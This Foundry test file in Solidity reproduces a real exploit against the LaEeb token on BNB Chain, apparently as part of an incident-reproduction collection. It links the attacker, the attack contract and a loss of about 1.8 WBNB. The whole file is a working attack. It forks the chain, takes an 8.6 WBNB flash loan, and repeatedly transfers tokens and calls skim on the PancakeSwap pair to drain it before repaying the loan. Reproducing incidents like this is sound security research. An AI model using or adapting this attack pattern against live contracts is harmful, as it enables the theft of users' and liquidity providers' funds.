pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~1.8 WBNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0x0d13a61e9dc81cfae324d3d80e49830d9bbae300f760e016a15600889a896a1b
// Attacker : https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891
// Attack Contract : https://bscscan.com/address/0x9180981034364f683ea25bcce0cff5e03a595bef
// GUY : https://x.com/MetaSec_xyz/status/1718964562165420076


contract Exploit is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x3921E8cb14e2C08DB989FDF88D01220a0C53cC91);
    IERC20 LaEeb = IERC20(0xa2B8A15A07385EA933088c6bcBB38B84c1051a58);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    function setUp() external {
        cheats.createSelectFork("bsc", 33053187);
    }

       function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        DPP.flashLoan(8.6 ether, 0, address(this), abi.encode("Attack"));
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
   

    }
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        swap_token_to_token(address(WBNB), address(LaEeb), 8.6 ether);
        uint256 i=0;
        while(i<10){
            LaEeb.transfer(address(Pair), 3255594269218 ether);
            Pair.skim(address(this));
            i++;
        }
        swap_token_to_token(address(LaEeb), address(WBNB), LaEeb.balanceOf(address(this)));
        WBNB.transfer(msg.sender,baseAmount);
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
